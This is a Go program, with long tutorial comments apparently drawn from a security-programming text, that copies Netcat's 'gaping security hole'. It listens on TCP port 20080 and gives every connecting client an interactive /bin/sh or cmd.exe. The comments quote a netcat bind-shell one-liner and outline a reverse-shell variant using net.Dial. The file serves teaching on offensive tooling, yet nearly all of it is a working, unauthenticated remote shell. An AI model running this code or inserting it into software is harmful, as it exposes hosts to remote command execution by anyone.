package main

import (
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
)

func handle(conn net.Conn) {
	/*
	 * Explicitly calling /bin/sh and using -i for interactive mode
	 * so that we can use it for stdin and stdout.
	 * For Windows use exec.Command("cmd.exe")
	 */
	var cmd *exec.Cmd
	os := runtime.GOOS
	if os == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
	}
	rp, wp := io.Pipe()
	// Set stdin to our connection
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func runNetcatExec() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}

}

func main() {
	// Replicating Netcat for Command Execution
	/*
		Netcat is the TCP/IP Swiss Army knife—essentially, a more flexible, scriptable version of Telnet. It contains a
		feature that allows stdin and stdout of any arbitrary program to be redirected over TCP, enabling an attacker to,
		for example, turn a single command execution vulnerability into operating system shell access.
		Consider the following:
			$ nc –lp 13337 –e /bin/bash
		This command creates a listening server on port 13337. Any remote client that connects, perhaps via Telnet,
		would be able to execute arbitrary bash commands—hence the reason this is referred to as a gaping security
		hole. Netcat allows you to optionally include this feature during program compilation. (For good reason,
		most Netcat binaries you’ll find on standard Linux builds do not include this feature.) It’s dangerous
		enough that we’ll show you how to create it in Go!
		First, look at Go’s os/exec package. You’ll use that for running operating system commands. This package
		defines a type, Cmd, that contains necessary methods and properties to run commands and manipulate stdin and
		stdout. You’ll redirect stdin (a Reader) and stdout (a Writer) to a Conn instance (which is both a Reader and
		a Writer).
		When you receive a new connection, you can use the Command(name string, arg ...string) function from os/exec to
		create a new Cmd instance. This function takes as parameters the operating system command and any arguments.
		In this example, hardcode /bin/sh as the command and pass -i as an argument such that you’re in interactive mode,
		which allows you to manipulate stdin and stdout more reliably:
			cmd := exec.Command("/bin/sh", "-i")
		This creates an instance of Cmd but doesn’t yet execute the command. You have a couple of options for manipulating
		stdin and stdout. You could use Copy(Writer, Reader) as discussed previously, or directly assign Reader and
		Writer to Cmd. Let’s directly assign your Conn object to both cmd.Stdin and cmd.Stdout, like so:
			cmd.Stdin = conn
			cmd.Stdout = conn
		With the setup of the command and the streams complete, you run the command by using cmd.Run():
			if err := cmd.Run(); err != nil {
			    // Handle error.
			}
		This logic works perfectly fine on Linux systems. However, when tweaking and running the program on a Windows
		system, running cmd.exe instead of /bin/bash, you’ll find that the connecting client never receives the command
		output because of some Windows-specific handling of anonymous pipes. Here are two solutions for this problem.
		1- First, you can tweak the code to explicitly force the flushing of stdout to correct this nuance. Instead of
		assigning Conn directly to cmd.Stdout, you implement a custom Writer that wraps bufio.Writer (a buffered writer)
		and explicitly calls its Flush method to force the buffer to be flushed.
		2- We’ll use this problem as an opportunity to introduce the io.Pipe() function, Go’s synchronous, in-memory
		pipe that can be used for connecting Readers and Writers:
			func Pipe() (*PipeReader, *PipeWriter)
		Using PipeReader and PipeWriter allows you to avoid having to explicitly flush the writer and synchronously
		connect stdout and the TCP connection. You will, yet again, rewrite the handler function.
		The call to io.Pipe() creates both a reader and a writer that are synchronously connected—any data written to
		the writer (wp in this example) will be read by the reader (rp). So, you assign the writer to cmd.Stdout and
		then use io.Copy(conn, rp) to link the PipeReader to the TCP connection. You do this by using a goroutine to
		prevent the code from blocking. Any standard output from the command gets sent to the writer and then
		subsequently piped to the reader and out over the TCP connection.

		With that, you’ve successfully implemented Netcat’s gaping security hole from the perspective of a TCP listener
		awaiting a connection. You can use similar logic to implement the feature from the perspective of a connecting
		client redirecting stdout and stdin of a local binary to a remote listener. The precise details are left to you
		to determine, but would likely include the following:
			- Establish a connection to a remote listener via net.Dial(network, address string).
			- Initialize a Cmd via exec.Command(name string, arg ...string).
			- Redirect Stdin and Stdout properties to utilize the net.Conn object.
			- Run the command.
		At this point, the listener should receive a connection. Any data sent to the client should be interpreted as
		stdin on the client, and any data received on the listener should be interpreted as stdout.
	*/
	runNetcatExec()
}